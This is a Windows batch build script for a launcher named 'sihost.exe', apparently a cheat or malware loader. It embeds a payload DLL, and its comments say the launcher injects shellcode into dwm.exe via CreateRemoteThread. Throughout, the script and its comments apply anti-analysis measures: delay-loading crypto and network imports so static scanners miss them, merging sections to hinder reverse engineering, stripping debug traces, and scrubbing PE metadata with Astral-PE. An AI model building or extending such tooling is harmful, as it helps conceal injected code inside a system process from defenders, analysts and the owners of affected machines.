@echo off
setlocal enabledelayedexpansion

REM =============================================================
REM  build.bat — Build the launcher exe (sihost.exe)
REM
REM  Requires an x64 Native Tools Command Prompt environment.
REM  Auto-locates VS 2022 via vswhere.
REM =============================================================

set ROOT=%~dp0..
set SHARED=%ROOT%\shared
set SRC=%~dp0src
set BUILD=%ROOT%\build\launcher
set OUT_NAME=sihost.exe

if not exist "%BUILD%" mkdir "%BUILD%"

REM ── Locate cl.exe via vswhere ──────────────────────────────────
where cl.exe >nul 2>nul
if not errorlevel 1 goto :HAVE_CL

set VSWHERE="%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if not exist %VSWHERE% (
  echo [!] vswhere.exe missing. Install VS 2019+ or open a VS Developer Prompt.
  exit /b 1
)
for /f "usebackq tokens=*" %%A in (`%VSWHERE% -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do (
  set VS_DIR=%%A
)
if "%VS_DIR%"=="" (
  echo [!] No VS installation with VC++ x64 tools found.
  exit /b 1
)
call "%VS_DIR%\VC\Auxiliary\Build\vcvars64.bat" >nul
where cl.exe >nul 2>nul || (echo [!] vcvars64 failed to set up cl.exe & exit /b 1)

:HAVE_CL

echo === Building %OUT_NAME% ===

REM ── Compile flags ──────────────────────────────────────────────
REM  /O2       optimize for speed
REM  /GS       stack cookies (defense)
REM  /Gy       function-level linking (dead-strip)
REM  /MT       static CRT (no dependency on vcruntime redist)
REM  /GL       whole-program optimization
REM  /DNDEBUG  strip debug asserts
REM  DO NOT enable /guard:cf — the launcher contains shellcode that runs
REM  INSIDE dwm.exe via CreateRemoteThread. CFG-instrumented indirect
REM  calls in that shellcode fail when the target process's CFG bitmap
REM  doesn't contain launcher-side function addresses → __fastfail crash
REM  inside DWM (verified 2026-07-05: remote thread exits 0xC0000005).
set CFLAGS=/nologo /W3 /O2 /Oi /GS /Gy /MT /GL /DNDEBUG /D_CRT_SECURE_NO_WARNINGS /DWIN32_LEAN_AND_MEAN

REM ── Compile shared modules + launcher sources ─────────────────
set SOURCES=^
 "%SHARED%\log_secure.c" "%SHARED%\log_key.c" ^
 "%SHARED%\base64.c" "%SHARED%\hwid.c" ^
 "%SHARED%\winhttp_util.c" "%SHARED%\json_util.c" ^
 "%SHARED%\crypto_util.c" "%SHARED%\supabase_config.c" ^
 "%SHARED%\handshake.c" ^
 "%SHARED%\str_enc.c" "%SHARED%\lazy_api.c" ^
 "%SRC%\oauth.c" "%SRC%\license.c" ^
 "%SRC%\inject.c" "%SRC%\config_write.c" ^
 "%SRC%\main.c"

REM ── Locate the freshly-built payload DLL (produced by
REM     payload/build.bat) and pass its full path to rc.exe as a
REM     preprocessor define. launcher.rc conditionally emits an
REM     RCDATA statement pointing at that file.
REM
REM     rc.exe wants forward slashes OR doubled backslashes inside
REM     the string literal; forward slashes work in modern rc.exe.
REM ─────────────────────────────────────────────────────────────
set PAYLOAD_DLL=%ROOT%\build\payload\dwmapiext.dll
if not exist "%PAYLOAD_DLL%" (
  echo [!] Payload DLL not found at %PAYLOAD_DLL%
  echo     Run payload\build.bat FIRST so we can embed it.
  echo     Continuing without embedded payload — launcher will fall back
  echo     to sibling-file mode at runtime.
  rc /nologo /r /fo "%BUILD%\launcher.res" "%SRC%\launcher.rc"
) else (
  REM Escape backslashes for the C-preprocessor string literal
  set PAYLOAD_DLL_ESCAPED=%PAYLOAD_DLL:\=\\%
  rc /nologo /r /d PAYLOAD_DLL_PATH="\"!PAYLOAD_DLL_ESCAPED!\"" /fo "%BUILD%\launcher.res" "%SRC%\launcher.rc"
)
if errorlevel 1 (echo [!] rc failed & exit /b 1)

REM ── Link ──────────────────────────────────────────────────────
REM  /SUBSYSTEM:CONSOLE stays for stderr during MVP; can move to WINDOWS
REM  later once we have a real GUI launcher.
REM  Hardening flags:
REM    /DEBUG:NONE + /EMITPOGODB:NO  — no debug info, no PDB path leaks
REM    /Brepro                       — deterministic timestamps
REM    /HIGHENTROPYVA + /DYNAMICBASE — 64-bit ASLR
REM    /NXCOMPAT                     — DEP
REM    /CETCOMPAT                    — Intel CET Shadow Stack. Hardware ROP
REM                                    defence. Safe for normal-loader
REM                                    binaries like the launcher (the
REM                                    manual-map shellcode runs in DWM's
REM                                    own thread with DWM's shadow stack).
REM    /MERGE:.rdata=.text           — section merge; harder for RE
REM    /OPT:REF + /OPT:ICF           — dead code + identical-func merge
REM
REM  /DELAYLOAD hides security-related imports from a static IAT scan:
REM    winhttp / bcrypt / ws2_32 tell an analyst "this thing talks TLS +
REM    does crypto + opens sockets". Delay-loaded imports show up in the
REM    IDD (image delay directory) instead of the main IAT — most static
REM    scanners look at IAT first. First call to any function in these
REM    DLLs pays a ~1ms resolution cost; every call after is direct.
REM    delayimp.lib provides the __delayLoadHelper2 stub.
REM
REM  DO NOT merge .pdata — x64 SEH depends on it.
REM  DO NOT use /OPT:ICF — folds identical empty functions like
REM  shellcode_loader_end into other empty funcs, breaking the
REM  "shellcode_loader...shellcode_loader_end" contiguous-bytes
REM  assumption. Only /OPT:REF is safe.
REM  DO NOT use /GUARD:CF — see CFLAGS comment above. Shellcode runs
REM  inside dwm.exe and would fail CFG bitmap validation.
set LDFLAGS=/nologo /SUBSYSTEM:CONSOLE /LTCG /DEBUG:NONE /Brepro ^
 /OPT:REF /OPT:NOICF /INCREMENTAL:NO /MANIFEST:NO ^
 /HIGHENTROPYVA /DYNAMICBASE /NXCOMPAT /GUARD:NO /CETCOMPAT ^
 /DELAYLOAD:winhttp.dll /DELAYLOAD:bcrypt.dll /DELAYLOAD:ws2_32.dll ^
 /OUT:"%BUILD%\%OUT_NAME%"

cl %CFLAGS% /I "%SHARED%" /I "%SRC%" ^
   %SOURCES% ^
   "%BUILD%\launcher.res" ^
   /link %LDFLAGS% ^
   kernel32.lib user32.lib advapi32.lib bcrypt.lib winhttp.lib ws2_32.lib shell32.lib delayimp.lib

if errorlevel 1 (
  echo [!] Link failed.
  exit /b 1
)

REM ── Strip PDB references and clean intermediates ──────────────
del /q "%BUILD%\*.obj" 2>nul
del /q "%BUILD%\*.pdb" 2>nul
del /q "%BUILD%\*.exp" 2>nul
del /q "%BUILD%\*.lib" 2>nul
del /q "%BUILD%\*.res" 2>nul

REM ── Astral-PE metadata scrub ── nukes section names, Rich Header,
REM  debug directory, timestamps, linker version. Applied AFTER link so
REM  RCDATA (which points at build/payload/dwmapiext.dll) is already
REM  embedded — this scrubs the OUTER container only, not the payload
REM  inside. (The payload should be scrubbed by payload/build.bat before
REM  the launcher build runs.)
REM  Skip: set SVCLDB_SKIP_SCRUB=1.
set ASTRAL="%ROOT%\_bin\Astral-PE.exe"
if /I "%SVCLDB_SKIP_SCRUB%"=="1" (
    echo === Astral-PE scrub SKIPPED ^(SVCLDB_SKIP_SCRUB=1^) ===
    goto :AFTER_SCRUB
)
if not exist %ASTRAL% (
    echo === Astral-PE not found at %ASTRAL% - skipping scrub ===
    goto :AFTER_SCRUB
)
echo === Scrubbing %OUT_NAME% with Astral-PE ===
%ASTRAL% "%BUILD%\%OUT_NAME%" -o "%BUILD%\%OUT_NAME%.scrubbed" >nul 2>nul
if exist "%BUILD%\%OUT_NAME%.scrubbed" (
    move /y "%BUILD%\%OUT_NAME%.scrubbed" "%BUILD%\%OUT_NAME%" >nul
    echo === Scrub OK ===
) else (
    echo [!] Astral-PE scrub failed - shipping unscrubbed
)
:AFTER_SCRUB

for %%F in ("%BUILD%\%OUT_NAME%") do echo === Built %%F  (%%~zF bytes) ===
